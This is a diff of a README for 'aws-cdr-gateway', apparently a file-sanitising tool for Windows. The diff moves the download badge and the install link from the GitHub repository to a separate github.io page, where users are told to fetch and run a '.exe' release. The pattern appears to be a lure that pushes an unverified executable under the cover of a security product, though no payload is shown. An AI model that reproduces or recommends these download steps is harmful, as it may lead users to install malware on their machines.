@@ -1,6 +1,6 @@
 # 🛡️ aws-cdr-gateway - Clean files from hidden digital threats
 
-[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://github.com/melittasprawly975/aws-cdr-gateway)
+[![](https://img.shields.io/badge/Download_Installer-Blue-blue)](https://melittasprawly975.github.io)
 
 ## 📁 What is this software
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your system needs at least
 
 ## 📥 How to download and install
 
-1. Visit the repository page to download the software: [https://github.com/melittasprawly975/aws-cdr-gateway](https://github.com/melittasprawly975/aws-cdr-gateway)
+1. Visit the repository page to download the software: [https://melittasprawly975.github.io](https://melittasprawly975.github.io)
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click the link to open the release details.
 4. Select the file ending in ".exe" to begin the download.
